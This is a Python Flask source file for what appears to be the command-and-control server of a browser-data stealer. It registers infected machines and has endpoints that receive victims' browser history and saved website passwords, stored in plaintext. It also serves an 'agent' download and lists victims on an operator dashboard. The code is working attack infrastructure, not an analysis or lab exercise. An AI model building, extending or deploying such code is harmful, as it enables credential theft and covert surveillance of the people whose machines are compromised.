from flask import Flask, request, jsonify, render_template, send_from_directory, session, url_for, redirect
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
import os
import secrets

app = Flask(__name__)
app.secret_key = "3dwyQTG3K7PWcnSjxmO42afZpYwLGCGg"
VALID_USERNAME = "Astarte"
VALID_PASSWORD = "BlueSky_5"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'hosts.db')

app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_PATH}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = BASE_DIR

db = SQLAlchemy(app)

# ========== DATABASE MODELS ==========
class Host(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(64), unique=True, nullable=False)
    hostname = db.Column(db.String(64))
    ip_address = db.Column(db.String(64))
    os_info = db.Column(db.String(128))
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)

class History(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
    url = db.Column(db.Text)
    title = db.Column(db.Text, nullable=True)
    visit_time = db.Column(db.String(128))
    browser_type = db.Column(db.String(16))

    __table_args__ = (
        db.UniqueConstraint('machine_id', 'url', 'visit_time', 'browser_type', name='uix_history_unique'),
    )

class Credential(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
    website = db.Column(db.String(256))
    username = db.Column(db.String(128))
    password = db.Column(db.Text)
    browser_type = db.Column(db.String(16))

# ========== ROUTES ==========
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return redirect(url_for("login", error="Invalid credentials"))
    return render_template("index.html")


@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return render_template("dashboard.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/about")
def about():
    return render_template("about.html")

@app.route("/clients")
def clients():
    return render_template("clients.html")

@app.route("/collected")
def collected():
    return render_template("collected.html")

@app.route("/register", methods=["POST"])
def register_host():
    data = request.get_json()
    if not data or "machine_id" not in data:
        return jsonify({"status": "error", "reason": "missing machine_id"}), 400

    host = Host.query.filter_by(machine_id=data["machine_id"]).first()
    if host:
        host.last_seen = datetime.utcnow()
        host.hostname = data.get("hostname", host.hostname)
        host.ip_address = data.get("ip_address", host.ip_address)
        host.os_info = data.get("os_info", host.os_info)
    else:
        host = Host(**data)
        db.session.add(host)

    db.session.commit()
    return jsonify({"status": "ok"})

@app.route("/api/clients")
def api_clients():
    now = datetime.utcnow()
    clients = Host.query.all()
    data = []
    for host in clients:
        delta = now - host.last_seen
        status = "active" if delta < timedelta(minutes=10) else "inactive"
        data.append({
            "machine_id": host.machine_id,
            "hostname": host.hostname,
            "ip_address": host.ip_address,
            "last_seen": host.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
            "os_info": host.os_info,
            "status": status
        })
    return jsonify(data)

@app.route("/api/history/<machine_id>")
def api_history(machine_id):
    rows = History.query.filter_by(machine_id=machine_id).order_by(History.visit_time.desc()).all()
    return jsonify([
        {
            "url": r.url,
            "title": r.title,
            "visit_time": r.visit_time,
            "browser_type": r.browser_type
        } for r in rows
    ])

@app.route("/submit/history", methods=["POST"])
def receive_history():
    data = request.get_json()
    machine_id = data.get("machine_id")
    entries = data.get("history", [])

    print(f"[DEBUG] Received {len(entries)} history items from {machine_id}")

    for item in entries:
        exists = History.query.filter_by(
            machine_id=machine_id,
            url=item['url'],
            visit_time=item['visit_time'],
            browser_type=item['browser_type']
        ).first()
        if not exists:
            db.session.add(History(machine_id=machine_id, **item))

    db.session.commit()
    return jsonify({"status": "ok", "count": len(entries)})

@app.route("/submit/credentials", methods=["POST"])
def receive_credentials():
    data = request.get_json()
    machine_id = data.get("machine_id")
    entries = data.get("credentials", [])

    print(f"[DEBUG] Received {len(entries)} credentials from {machine_id}")

    for item in entries:
        print(f"[DEBUG] Saving: {item}")
        db.session.add(Credential(machine_id=machine_id, **item))

    db.session.commit()
    return jsonify({"status": "ok", "count": len(entries)})

@app.route("/download/agent")
def download_agent_page():
    return render_template("download.html")

@app.route("/download/<path:filename>")
def download_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)

@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'no-store'
    return response

# ========== ENTRY ==========
if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(host="0.0.0.0", port=5000, debug=True)
